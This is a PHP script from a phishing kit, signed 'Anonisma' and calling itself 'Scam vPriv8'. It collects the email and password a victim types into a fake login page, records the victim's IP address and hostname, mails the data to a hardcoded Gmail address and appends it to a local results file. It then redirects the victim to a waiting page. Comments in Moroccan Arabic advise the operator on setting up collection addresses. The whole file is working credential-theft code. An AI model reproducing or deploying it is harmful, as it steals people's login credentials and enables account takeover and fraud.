<?php

//Anonisma ...

$ip = getenv("REMOTE_ADDR");                                                                          
$hostname = gethostbyaddr($ip);
$message .= "|----------+|Scam vPriv8 By Anonisma|+--------------|\n";
$message .= "|E-M-L      : ".$_POST['1995']."\n";
$message .= "|P-S-S-D    : ".$_POST['19955']."\n";
$message .= "|----|Información de la victima|-----|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|HostName : ".$hostname."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "|----------|Scam vPriv8  by Anonisma|--------------|\n";
$send = "yazidanjar@Gmail.com  ,  ";   // <=== Dir 2 email wa7d Hotmail o wa7d Yahou wla Gmail , dir 2 ach khsarti bach ta yla waslat khawya fwa7d fflakhor yji 3amra                                        
$subject = " +| vPriv8 Nuevos Resultados L/O/G/I/N |+ $ip";
mail("$send", "$subject", $message);   
$f = fopen("./resultados.txt", "a");  // ila waslat chi haja khawya dkhol : ./email/resultados.txt ===> tal9a result maktouba
fwrite($f, $message);

?>

<html>
<script language="javascript">
var page = "../web-please-wait.php?"          
top.location = page;
</script> 
</html>